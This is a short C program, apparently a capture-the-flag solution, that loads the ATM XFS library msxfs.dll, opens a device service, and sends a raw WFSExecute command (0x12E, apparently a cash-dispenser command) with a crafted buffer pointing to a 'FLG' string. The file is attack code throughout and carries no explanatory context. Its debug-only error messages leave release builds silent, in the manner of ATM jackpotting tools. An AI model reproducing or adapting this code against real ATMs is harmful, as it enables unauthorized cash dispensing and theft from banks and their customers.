#include <stdint.h>
#include <Windows.h>
#include "xfsapi.h"

#ifdef _DEBUG
#include <stdio.h>
#include <stdlib.h>
#endif

#define MSXFS_PATH L"C:\\Packages\\xfs\\msxfs.dll"

typedef uint16_t HSERVICE;

typedef struct COMMAND {
    unsigned char padding[10];
    unsigned char data[8];
} COMMAND;

int main()
{
    HMODULE hMsxfs = LoadLibraryW(MSXFS_PATH);

#ifdef _DEBUG
    if (hMsxfs == NULL) {
        printf("Failed to load msxfs.dll\n");
        return 1;
    }
#endif

    HRESULT(*WFSCreateAppHandle)(LPHAPP) = (HRESULT(*)(LPHAPP))GetProcAddress(hMsxfs, "WFSCreateAppHandle");
    HRESULT(*WFSOpen)(LPCSTR, HAPP, LPCSTR, DWORD, DWORD, DWORD, LPWFSVERSION, LPWFSVERSION, LPHSERVICE) = (HRESULT(*)(LPCSTR, HAPP, LPCSTR, DWORD, DWORD, DWORD, LPWFSVERSION, LPWFSVERSION, LPHSERVICE))GetProcAddress(hMsxfs, "WFSOpen");
    HRESULT(*WFSExecute)(HSERVICE, DWORD, void*, DWORD, void**) = (HRESULT(*)(HSERVICE, DWORD, void*, DWORD, void**))GetProcAddress(hMsxfs, "WFSExecute");

#ifdef _DEBUG
    if (WFSOpen == NULL) {
        printf("Failed to load WFSOpen\n");
        return 1;
    }
    if (WFSCreateAppHandle == NULL) {
        printf("Failed to load WFSCreateAppHandle\n");
        return 1;
    }
    if (WFSExecute == NULL) {
        printf("Failed to load WFSExecute\n");
        return 1;
    }
#endif

    HAPP app;
    HRESULT result = WFSCreateAppHandle(&app);

#ifdef _DEBUG
    if (result != WFS_SUCCESS) {
        printf("Failed to create app handle\n");
        return 1;
    }
#endif
    WFSVERSION version, version2;
    HSERVICE service;
    HRESULT open = WFSOpen("caca", app, NULL, NULL, WFS_INDEFINITE_WAIT, 1, &version, &version2, &service);

    COMMAND lpCmdData = { 0 };

    lpCmdData.padding[2] = 1;
    const char* flag = "FLG";
    *(int64_t*)(lpCmdData.data) = (int64_t)flag;

    void* lppResult;
    HRESULT result2 = WFSExecute(service, 0x12E, (void*)&lpCmdData, 0, &lppResult);

    return 0;
}